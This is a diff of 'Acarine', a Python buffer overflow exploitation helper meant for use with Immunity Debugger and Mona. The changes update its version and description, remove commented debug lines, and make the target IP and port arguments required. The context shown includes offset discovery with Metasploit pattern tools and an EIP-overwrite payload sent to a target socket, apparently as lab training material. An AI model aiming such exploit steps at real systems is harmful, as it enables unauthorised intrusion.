@@ -1,16 +1,14 @@
 #!/bin/python
 
-# Acarine v1.0.1
+# Acarine v1.0.2
 
 # Usage: 
     # Acarine.py -t [IP] -p [PORT]
 # Description:
-    # Acarine is a Buffer Overflow utility.
+    # Acarine is a Buffer Overflow utility and guide.
     # It is to be used in conjunction with Immunity Debugger and Immunity's Mona module.
 # Dependencies:
     # Metasploit Framework Tools
-# Pending Fixes:
-    # Error message to be added if incorrect args entered in terminal.
 
 import argparse
 import socket
@@ -163,8 +161,6 @@ Make sure to {color.PURPLE}RE-LOAD and RE-RUN{color.END} the program you are tes
             print(f"{color.RED}\nInput must be an Integer! Reloading section!{color.END}")
             offsetTest()
     patternC = subprocess.run(['msf-pattern_create','-l', str(pattern)], capture_output=True, text=True)
-    # print(patternC.stdout)
-    # bufferSend(patternC.stdout)
     if bufferSend(patternC.stdout) == 0:
         try:
             EIP = int(input(f"{color.GREEN}Enter the value of the EIP: {color.END}"))
@@ -184,7 +180,6 @@ Make sure to {color.PURPLE}RE-LOAD and RE-RUN{color.END} the program you are tes
     print(f"\n{patternOffsetOutput}")
     global offset
     offset = int(patternOffsetOutput[26:])
-    # print(offset)
     print(f"""Now we need to test whether we are on target and have indeed successfully discovered the offset.\n
 We will now send a payload of Four 'B' characters ('42424242' in hex) with our offset of {offset}.
 If we are successful the EIP will read '42424242' as these 'B' should land exactly.\n
@@ -192,7 +187,6 @@ Again, make sure to {color.PURPLE}RE-LOAD and RE-RUN{color.END} the program you 
     BCharTest = input(f"{color.GREEN}[ENTER] to Continue: {color.END}")
     menuCheck(BCharTest)
     offsetLoad = "A" * offset + "B" * 4
-    # bufferSend(offsetLoad)
     if bufferSend(offsetLoad) == 0:
         print(f"""The program should now have crashed and the EIP should read '42424242'.\n
 This means we are on target and now we will move on to the finding Bad Characters.\n""")
@@ -474,8 +468,8 @@ Target:
 # [!] Main:
 
 parser = argparse.ArgumentParser()
-parser.add_argument('-t','-T','--target', help="target IP")#,default=socket.gethostname())
-parser.add_argument('-p','-P','--port', help="target PORT", type=int)
+parser.add_argument('-t','-T','--target', required=True, help="target IP")
+parser.add_argument('-p','-P','--port', required=True, help="target PORT", type=int)
 args = parser.parse_args()
 
 HOST = args.target
